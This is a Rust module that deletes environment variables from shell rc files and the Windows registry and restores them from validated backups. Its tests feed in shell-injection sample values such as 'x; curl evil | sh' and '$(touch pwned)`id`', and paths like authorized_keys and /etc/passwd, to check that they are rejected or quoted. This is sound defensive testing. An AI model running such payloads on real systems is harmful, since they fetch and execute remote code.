use super::env_checker::EnvConflict;
use crate::config::atomic_write;
use chrono::Utc;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};

#[cfg(target_os = "windows")]
use winreg::enums::*;
#[cfg(target_os = "windows")]
use winreg::RegKey;

#[derive(Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct BackupInfo {
    pub backup_path: String,
    pub timestamp: String,
    pub conflicts: Vec<EnvConflict>,
}

/// Delete environment variables with automatic backup
pub fn delete_env_vars(conflicts: Vec<EnvConflict>) -> Result<BackupInfo, String> {
    // Step 0: Conflicts come from the webview; only touch known shell rc files
    let rc_files = allowed_rc_files();
    for conflict in &conflicts {
        validate_conflict(conflict, &rc_files)?;
    }

    // Step 1: Create backup
    let backup_info = create_backup(&conflicts)?;

    // Step 2: Delete variables
    for conflict in &conflicts {
        match delete_single_env(conflict) {
            Ok(_) => {}
            Err(e) => {
                // If deletion fails, we keep the backup but return error
                return Err(format!(
                    "删除环境变量失败: {}. 备份已保存到: {}",
                    e, backup_info.backup_path
                ));
            }
        }
    }

    Ok(backup_info)
}

/// Create backup file before deletion
fn create_backup(conflicts: &[EnvConflict]) -> Result<BackupInfo, String> {
    // Get backup directory
    let backup_dir = get_backup_dir()?;
    fs::create_dir_all(&backup_dir).map_err(|e| format!("创建备份目录失败: {e}"))?;

    // Generate backup file name with timestamp
    let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
    let backup_file = backup_dir.join(format!("env-backup-{timestamp}.json"));

    // Create backup data
    let backup_info = BackupInfo {
        backup_path: backup_file.to_string_lossy().to_string(),
        timestamp: timestamp.clone(),
        conflicts: conflicts.to_vec(),
    };

    // Write backup file
    let json = serde_json::to_string_pretty(&backup_info)
        .map_err(|e| format!("序列化备份数据失败: {e}"))?;

    atomic_write(&backup_file, json.as_bytes()).map_err(|e| format!("写入备份文件失败: {e}"))?;

    Ok(backup_info)
}

/// Get backup directory path
fn get_backup_dir() -> Result<PathBuf, String> {
    let home = dirs::home_dir().ok_or("无法获取用户主目录")?;
    Ok(home.join(".cc-switch").join("backups"))
}

/// Delete a single environment variable
#[cfg(target_os = "windows")]
fn delete_single_env(conflict: &EnvConflict) -> Result<(), String> {
    match conflict.source_type.as_str() {
        "system" => {
            if conflict.source_path.contains("HKEY_CURRENT_USER") {
                let hkcu = RegKey::predef(HKEY_CURRENT_USER)
                    .open_subkey_with_flags("Environment", KEY_ALL_ACCESS)
                    .map_err(|e| format!("打开注册表失败: {}", e))?;

                hkcu.delete_value(&conflict.var_name)
                    .map_err(|e| format!("删除注册表项失败: {}", e))?;
            } else if conflict.source_path.contains("HKEY_LOCAL_MACHINE") {
                let hklm = RegKey::predef(HKEY_LOCAL_MACHINE)
                    .open_subkey_with_flags(
                        "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",
                        KEY_ALL_ACCESS,
                    )
                    .map_err(|e| format!("打开系统注册表失败 (需要管理员权限): {}", e))?;

                hklm.delete_value(&conflict.var_name)
                    .map_err(|e| format!("删除系统注册表项失败: {}", e))?;
            }
            Ok(())
        }
        "file" => Err("Windows 系统不应该有文件类型的环境变量".to_string()),
        _ => Err(format!("未知的环境变量来源类型: {}", conflict.source_type)),
    }
}

#[cfg(not(target_os = "windows"))]
fn delete_single_env(conflict: &EnvConflict) -> Result<(), String> {
    match conflict.source_type.as_str() {
        "file" => {
            // Parse file path and line number from source_path (format: "path:line")
            let parts: Vec<&str> = conflict.source_path.split(':').collect();
            if parts.len() < 2 {
                return Err("无效的文件路径格式".to_string());
            }

            let file_path = parts[0];

            // Read file content
            let content = fs::read_to_string(file_path)
                .map_err(|e| format!("读取文件失败 {file_path}: {e}"))?;

            // Filter out the line containing the environment variable
            let new_content: Vec<String> = content
                .lines()
                .filter(|line| {
                    let trimmed = line.trim();
                    let export_line = trimmed.strip_prefix("export ").unwrap_or(trimmed);

                    // Check if this line sets the target variable
                    if let Some(eq_pos) = export_line.find('=') {
                        let var_name = export_line[..eq_pos].trim();
                        var_name != conflict.var_name
                    } else {
                        true
                    }
                })
                .map(|s| s.to_string())
                .collect();

            // Write back to file
            atomic_write(Path::new(file_path), new_content.join("\n").as_bytes())
                .map_err(|e| format!("写入文件失败 {file_path}: {e}"))?;

            Ok(())
        }
        "system" => {
            // On Unix, we can't directly delete process environment variables
            Ok(())
        }
        _ => Err(format!("未知的环境变量来源类型: {}", conflict.source_type)),
    }
}

/// Restore environment variables from backup
pub fn restore_from_backup(backup_path: String) -> Result<(), String> {
    restore_from_backup_in(&backup_path, &get_backup_dir()?, &allowed_rc_files())
}

fn restore_from_backup_in(
    backup_path: &str,
    backup_dir: &Path,
    rc_files: &[String],
) -> Result<(), String> {
    let backup_file = validate_backup_path(backup_path, backup_dir)?;

    // Read backup file
    let content = fs::read_to_string(&backup_file).map_err(|e| format!("读取备份文件失败: {e}"))?;

    let backup_info: BackupInfo =
        serde_json::from_str(&content).map_err(|e| format!("解析备份文件失败: {e}"))?;

    // Validate every entry before writing anything
    for conflict in &backup_info.conflicts {
        validate_conflict(conflict, rc_files)?;
    }

    // Restore each variable
    for conflict in &backup_info.conflicts {
        restore_single_env(conflict)?;
    }

    Ok(())
}

/// Shell rc files that delete/restore may modify (the same files the checker scans)
#[cfg(not(target_os = "windows"))]
fn allowed_rc_files() -> Vec<String> {
    super::env_checker::shell_config_files()
}

#[cfg(target_os = "windows")]
fn allowed_rc_files() -> Vec<String> {
    Vec::new()
}

/// The backup must be an `env-backup-*.json` file created by `create_backup` in the backup dir
fn validate_backup_path(backup_path: &str, backup_dir: &Path) -> Result<PathBuf, String> {
    let canonical_dir = fs::canonicalize(backup_dir).map_err(|e| format!("备份目录不可用: {e}"))?;
    let canonical_file =
        fs::canonicalize(backup_path).map_err(|e| format!("读取备份文件失败: {e}"))?;

    let file_name = canonical_file
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or_default();
    let is_env_backup = file_name.starts_with("env-backup-") && file_name.ends_with(".json");

    if !canonical_file.starts_with(&canonical_dir) || !is_env_backup || !canonical_file.is_file() {
        return Err(format!("备份文件不在备份目录中，已拒绝: {backup_path}"));
    }
    Ok(canonical_file)
}

/// Reject entries that would write outside known rc files or inject extra shell lines
fn validate_conflict(conflict: &EnvConflict, rc_files: &[String]) -> Result<(), String> {
    let name = &conflict.var_name;
    let valid_name = name
        .chars()
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
    if !valid_name {
        return Err(format!("无效的环境变量名: {name}"));
    }
    if conflict
        .var_value
        .chars()
        .any(|c| matches!(c, '\n' | '\r' | '\0'))
    {
        return Err(format!("环境变量 {name} 的值包含非法字符"));
    }

    if conflict.source_type == "file" {
        let file_path = conflict.source_path.split(':').next().unwrap_or_default();
        if !rc_files.iter().any(|allowed| allowed == file_path) {
            return Err(format!("不允许修改的文件: {file_path}"));
        }
    }

    Ok(())
}

/// Quote a value for an `export NAME=VALUE` line so it can never run shell code.
///
/// Values made only of characters that are inert in POSIX shells are written as-is
/// (unchanged output for typical keys and URLs); anything else (`;`, `$(...)`, backticks,
/// `&`, spaces, quotes, ...) is single-quoted, escaping embedded `'` as `'\''`.
#[cfg(not(target_os = "windows"))]
fn shell_quote_value(value: &str) -> String {
    let is_inert = |c: char| c.is_ascii_alphanumeric() || "_-.,:/@%+=~^".contains(c);
    if !value.is_empty() && value.chars().all(is_inert) {
        value.to_string()
    } else {
        format!("'{}'", value.replace('\'', "'\\''"))
    }
}

/// Restore a single environment variable
#[cfg(target_os = "windows")]
fn restore_single_env(conflict: &EnvConflict) -> Result<(), String> {
    match conflict.source_type.as_str() {
        "system" => {
            if conflict.source_path.contains("HKEY_CURRENT_USER") {
                let (hkcu, _) = RegKey::predef(HKEY_CURRENT_USER)
                    .create_subkey("Environment")
                    .map_err(|e| format!("打开注册表失败: {}", e))?;

                hkcu.set_value(&conflict.var_name, &conflict.var_value)
                    .map_err(|e| format!("恢复注册表项失败: {}", e))?;
            } else if conflict.source_path.contains("HKEY_LOCAL_MACHINE") {
                let (hklm, _) = RegKey::predef(HKEY_LOCAL_MACHINE)
                    .create_subkey(
                        "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",
                    )
                    .map_err(|e| format!("打开系统注册表失败 (需要管理员权限): {}", e))?;

                hklm.set_value(&conflict.var_name, &conflict.var_value)
                    .map_err(|e| format!("恢复系统注册表项失败: {}", e))?;
            }
            Ok(())
        }
        _ => Err(format!(
            "无法恢复类型为 {} 的环境变量",
            conflict.source_type
        )),
    }
}

#[cfg(not(target_os = "windows"))]
fn restore_single_env(conflict: &EnvConflict) -> Result<(), String> {
    match conflict.source_type.as_str() {
        "file" => {
            // Parse file path from source_path
            let parts: Vec<&str> = conflict.source_path.split(':').collect();
            if parts.is_empty() {
                return Err("无效的文件路径格式".to_string());
            }

            let file_path = parts[0];

            // Read file content
            let mut content = fs::read_to_string(file_path)
                .map_err(|e| format!("读取文件失败 {file_path}: {e}"))?;

            // Append the environment variable line
            let export_line = format!(
                "\nexport {}={}",
                conflict.var_name,
                shell_quote_value(&conflict.var_value)
            );
            content.push_str(&export_line);

            // Write back to file
            atomic_write(Path::new(file_path), content.as_bytes())
                .map_err(|e| format!("写入文件失败 {file_path}: {e}"))?;

            Ok(())
        }
        _ => Err(format!(
            "无法恢复类型为 {} 的环境变量",
            conflict.source_type
        )),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_backup_dir_creation() {
        let backup_dir = get_backup_dir();
        assert!(backup_dir.is_ok());
    }

    fn file_conflict(path: &Path, name: &str, value: &str) -> EnvConflict {
        EnvConflict {
            var_name: name.to_string(),
            var_value: value.to_string(),
            source_type: "file".to_string(),
            source_path: format!("{}:1", path.display()),
        }
    }

    fn write_backup(dir: &Path, file_name: &str, conflicts: Vec<EnvConflict>) -> PathBuf {
        fs::create_dir_all(dir).unwrap();
        let path = dir.join(file_name);
        let info = BackupInfo {
            backup_path: path.to_string_lossy().to_string(),
            timestamp: "20260101_000000".to_string(),
            conflicts,
        };
        fs::write(&path, serde_json::to_string(&info).unwrap()).unwrap();
        path
    }

    #[test]
    fn restore_rejects_source_path_that_is_not_an_rc_file() {
        let temp = tempfile::TempDir::new().unwrap();
        let backup_dir = temp.path().join("backups");
        let rc = temp.path().join(".zshrc");
        fs::write(&rc, "# rc\n").unwrap();
        let target = temp.path().join("authorized_keys");
        fs::write(&target, "original\n").unwrap();
        let backup = write_backup(
            &backup_dir,
            "env-backup-1.json",
            vec![file_conflict(&target, "ANTHROPIC_API_KEY", "x")],
        );
        let rc_files = vec![rc.to_string_lossy().to_string()];

        let err =
            restore_from_backup_in(&backup.to_string_lossy(), &backup_dir, &rc_files).unwrap_err();
        assert!(err.contains("不允许修改的文件"), "{err}");
        assert_eq!(fs::read_to_string(&target).unwrap(), "original\n");
    }

    #[test]
    fn restore_rejects_backup_outside_backup_dir() {
        let temp = tempfile::TempDir::new().unwrap();
        let backup_dir = temp.path().join("backups");
        fs::create_dir_all(&backup_dir).unwrap();
        let rc = temp.path().join(".zshrc");
        fs::write(&rc, "# rc\n").unwrap();
        let rc_files = vec![rc.to_string_lossy().to_string()];
        let conflicts = vec![file_conflict(&rc, "ANTHROPIC_API_KEY", "x")];

        let outside = write_backup(temp.path(), "env-backup-1.json", conflicts.clone());
        let wrong_name = write_backup(&backup_dir, "db_backup.json", conflicts.clone());
        let traversal = backup_dir.join("..").join("env-backup-1.json");
        for path in [outside, wrong_name, traversal] {
            let err = restore_from_backup_in(&path.to_string_lossy(), &backup_dir, &rc_files)
                .unwrap_err();
            assert!(err.contains("已拒绝"), "{err}");
        }
        assert_eq!(fs::read_to_string(&rc).unwrap(), "# rc\n");
    }

    #[test]
    fn restore_rejects_values_that_inject_extra_lines() {
        let temp = tempfile::TempDir::new().unwrap();
        let backup_dir = temp.path().join("backups");
        let rc = temp.path().join(".zshrc");
        fs::write(&rc, "# rc\n").unwrap();
        let rc_files = vec![rc.to_string_lossy().to_string()];

        for conflict in [
            file_conflict(&rc, "OK", "x\ncurl evil | sh"),
            file_conflict(&rc, "BAD;NAME", "x"),
            file_conflict(&rc, "", "x"),
        ] {
            let backup = write_backup(&backup_dir, "env-backup-1.json", vec![conflict]);
            assert!(
                restore_from_backup_in(&backup.to_string_lossy(), &backup_dir, &rc_files).is_err()
            );
        }
        assert_eq!(fs::read_to_string(&rc).unwrap(), "# rc\n");
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn restore_appends_export_to_allowed_rc_file() {
        let temp = tempfile::TempDir::new().unwrap();
        let backup_dir = temp.path().join("backups");
        let rc = temp.path().join(".zshrc");
        fs::write(&rc, "# rc").unwrap();
        let backup = write_backup(
            &backup_dir,
            "env-backup-20260101_000000.json",
            vec![file_conflict(
                &rc,
                "ANTHROPIC_BASE_URL",
                "https://example.com",
            )],
        );
        let rc_files = vec![rc.to_string_lossy().to_string()];

        restore_from_backup_in(&backup.to_string_lossy(), &backup_dir, &rc_files).unwrap();
        assert_eq!(
            fs::read_to_string(&rc).unwrap(),
            "# rc\nexport ANTHROPIC_BASE_URL=https://example.com"
        );
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn restore_quotes_values_that_would_run_shell_code() {
        let temp = tempfile::TempDir::new().unwrap();
        let backup_dir = temp.path().join("backups");
        let rc = temp.path().join(".zshrc");
        fs::write(&rc, "# rc").unwrap();
        let backup = write_backup(
            &backup_dir,
            "env-backup-20260101_000000.json",
            vec![
                file_conflict(&rc, "ANTHROPIC_A", "x; curl evil | sh"),
                file_conflict(&rc, "ANTHROPIC_B", "$(touch pwned)`id`"),
                file_conflict(&rc, "ANTHROPIC_C", "it's"),
                file_conflict(&rc, "ANTHROPIC_D", "https://h/p?a=1&b=2"),
            ],
        );
        let rc_files = vec![rc.to_string_lossy().to_string()];

        restore_from_backup_in(&backup.to_string_lossy(), &backup_dir, &rc_files).unwrap();
        assert_eq!(
            fs::read_to_string(&rc).unwrap(),
            "# rc\n\
             export ANTHROPIC_A='x; curl evil | sh'\n\
             export ANTHROPIC_B='$(touch pwned)`id`'\n\
             export ANTHROPIC_C='it'\\''s'\n\
             export ANTHROPIC_D='https://h/p?a=1&b=2'"
        );
    }

    #[test]
    fn delete_validation_rejects_files_that_are_not_rc_files() {
        let rc_files = vec!["/home/u/.zshrc".to_string()];
        let conflict = file_conflict(Path::new("/etc/passwd"), "ANTHROPIC_API_KEY", "x");
        assert!(validate_conflict(&conflict, &rc_files).is_err());
        let conflict = file_conflict(Path::new("/home/u/.zshrc"), "ANTHROPIC_API_KEY", "x");
        assert!(validate_conflict(&conflict, &rc_files).is_ok());
    }
}
